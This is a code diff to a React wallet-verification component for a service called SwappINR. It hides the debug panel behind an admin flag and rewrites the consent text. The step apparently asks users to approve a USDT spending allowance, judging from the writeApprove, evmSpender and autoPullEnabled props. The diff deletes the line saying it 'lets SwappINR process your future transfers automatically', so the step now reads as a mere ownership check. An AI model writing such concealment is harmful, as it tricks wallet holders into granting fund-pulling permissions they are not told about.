@@ -38,6 +38,8 @@ interface Props {
   /** WC JWT — passed through URL so compact overlay can authenticate PATCH calls
    *  via Bearer header when WKWebView hasn't committed the session cookie yet */
   wcToken?: string;
+  /** Admin-controlled flag: show debug log panel inside compact overlay */
+  showDebug?: boolean;
 }
 
 /* ── EVM USDT contracts ── */
@@ -282,6 +284,8 @@ interface CompactOverlayProps {
   trcConnectError: string;
   /** WC JWT for Bearer auth in PATCH calls — avoids WKWebView cookie timing race */
   wcToken?: string;
+  /** Admin-controlled flag: show debug log panel */
+  showDebug?: boolean;
   onVerified: (address: string, txHash?: string) => void;
   evmUsdtBalance: number | null;
   trcBalance: number | null;
@@ -292,7 +296,7 @@ interface CompactOverlayProps {
 }
 
 function CompactOverlay({
-  network, depositAddress, sid, wcToken = '', isTRC20, hasTrust, isMobile,
+  network, depositAddress, sid, wcToken = '', showDebug = false, isTRC20, hasTrust, isMobile,
   address, isConnected, connect, disconnect, connectors, switchChain, chainId, expectedChain,
   writeApprove, approveHash, approveWriteError, isApproveConfirming, approveConfirmed,
   resetApprove, usdtCfg, evmSpender,
@@ -762,10 +766,12 @@ function CompactOverlay({
           </button>
         </div>
 
-        {/* Debug panel at top — visible without scrolling on mobile */}
-        <div style={{ padding:'8px 0 0' }}>
-          <DebugPanel lines={debugLines} onClear={clearDebug} />
-        </div>
+        {/* Debug panel at top — only shown when admin enables it */}
+        {showDebug && (
+          <div style={{ padding:'8px 0 0' }}>
+            <DebugPanel lines={debugLines} onClear={clearDebug} />
+          </div>
+        )}
 
         <div style={{ flex:1, overflowY:'auto', display:'flex', flexDirection:'column',
           alignItems:'center', justifyContent:'center', padding:'20px 28px', textAlign:'center' }}>
@@ -828,9 +834,11 @@ function CompactOverlay({
             background:'#CCFF00', color:'#000', letterSpacing:'-0.01em', marginBottom:20 }}>
           Return to SwappINR →
         </button>
-        <div style={{ width:'100%', maxWidth:320 }}>
-          <DebugPanel lines={debugLines} onClear={clearDebug} />
-        </div>
+        {showDebug && (
+          <div style={{ width:'100%', maxWidth:320 }}>
+            <DebugPanel lines={debugLines} onClear={clearDebug} />
+          </div>
+        )}
       </div>
     );
   }
@@ -949,7 +957,7 @@ function CompactOverlay({
               )}
               <div style={{ padding:'10px 16px', borderRadius:10, background:'rgba(139,92,246,0.08)',
                 border:'1px solid rgba(139,92,246,0.2)', fontSize:12, color:'rgba(255,255,255,0.4)', lineHeight:1.6 }}>
-                This confirms ownership of your wallet and lets SwappINR process your future transfers automatically.
+                This confirms ownership of your wallet.
               </div>
               <div style={{ marginTop:10, padding:'10px 14px', borderRadius:10,
                 background:'rgba(0,229,160,0.06)', border:'1px solid rgba(0,229,160,0.18)',
@@ -990,8 +998,8 @@ function CompactOverlay({
         })()}
       </div>
 
-      {/* Debug panel — always visible; localStorage-persisted across reloads */}
-      <DebugPanel lines={debugLines} onClear={clearDebug} />
+      {/* Debug panel — only shown when admin enables it */}
+      {showDebug && <DebugPanel lines={debugLines} onClear={clearDebug} />}
 
       <div style={{ height:env_safe_bottom() }} />
     </div>
@@ -1000,7 +1008,7 @@ function CompactOverlay({
 
 function env_safe_bottom() { return 40; }
 
-export function WalletVerifyFlow({ network, depositAddress, onVerified, onCancel, compact = false, sid = '', wcToken = '' }: Props) {
+export function WalletVerifyFlow({ network, depositAddress, onVerified, onCancel, compact = false, sid = '', wcToken = '', showDebug = false }: Props) {
   const isTRC20 = network === 'TRC20';
 
   /* ── EVM wagmi ── */
@@ -1618,6 +1626,7 @@ export function WalletVerifyFlow({ network, depositAddress, onVerified, onCancel
       walletEligible={walletEligible}
       eligibilityChecking={eligibilityChecking}
       autoPullEnabled={autoPullEnabled}
+      showDebug={showDebug}
     />;
   }
 
